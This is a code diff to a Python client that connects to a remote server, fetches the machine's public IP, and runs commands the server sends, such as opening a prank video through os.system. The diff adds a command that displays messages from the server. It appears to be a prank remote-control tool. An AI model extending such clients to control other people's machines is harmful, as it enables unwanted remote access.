@@ -10,6 +10,8 @@ from requests import get
 SERVER_HOST = "127.0.0.1" # your server address
 SERVER_PORT = 8080 #your server port
 
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 ip = get('https://api.ipify.org').text
 #test2 = socket.gethostname()
 #test = socket.gethostbyname(hostname)
@@ -43,6 +45,13 @@ while True:
 
     if command.lower() == "rickroll":
         os.system("start https://youtu.be/xvFZjo5PgG0")
+        
+    if command.lower()== "message":
+        message = s.recv(1024)
+        print(f" {Colors.white}[{Colors.red}!{Colors.white}] Message received: {Colors.green}"+message.decode())
+        Colors.white
+        #s.send(1024)
+        
 
     #if command.lower() == "message":
     #    x = s.recv(1024).decode()
@@ -50,7 +59,7 @@ while True:
 
 
 
-   # print(f"{Colors.white}LOG:{Colors.green}",command) # if you want to see the logs just reitre the # in this line
+        #print(f"{Colors.white}LOG:{Colors.green}",message) # if you want to see the logs just reitre the # in this line
 
     
 s.close()
